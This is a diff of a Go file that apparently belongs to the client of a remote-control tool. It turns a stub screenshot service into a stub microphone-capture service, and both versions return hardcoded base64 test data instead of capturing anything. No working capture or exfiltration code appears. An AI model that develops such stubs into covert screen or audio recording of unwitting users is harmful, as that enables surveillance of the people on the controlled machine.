@@ -1,20 +1,22 @@
-,package screenshot
+package microphone
 
 import (
 	"github.com/tiagorlampert/CHAOS/client/app/services"
 )
 
-type Service struct{}
-
-func NewService() services.Screenshot {
-	return &Service{}
+type Service struct {
+	Terminal services.Terminal
 }
 
-func (s Service) TakeScreenshot(quality int) ([]byte, error) {
-	// Test implementation - return a small test screenshot
-	// In real implementation, capture actual screen
-	testImage := `iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==`
-	binaryData, err := decodeBase64(testImage)
+func NewService(terminal services.Terminal) services.Microphone {
+	return &Service{Terminal: terminal}
+}
+
+func (m Service) CaptureAudio(duration int, quality int) ([]byte, error) {
+	// Test implementation - return a small test audio
+	// In real implementation, capture from microphone
+	testAudio := `UklGRnoGAABXQVZFZm10IAAAAAEAAQARAAAAEAAAAAEACABkYXRhAgAAAAEA`
+	binaryData, err := decodeBase64(testAudio)
 	if err != nil {
 		return nil, err
 	}
@@ -27,9 +29,11 @@ func decodeBase64(s string) ([]byte, error) {
 	var result []byte
 	var buffer byte
 	var bits uint
+	var padding int
 
 	for _, r := range s {
 		if r == '=' {
+			padding++
 			continue
 		}
 
@@ -45,7 +49,7 @@ func decodeBase64(s string) ([]byte, error) {
 		} else if r == '/' {
 			val = 63
 		} else {
-			continue
+			continue // skip invalid chars
 		}
 
 		buffer = (buffer << 6) | val
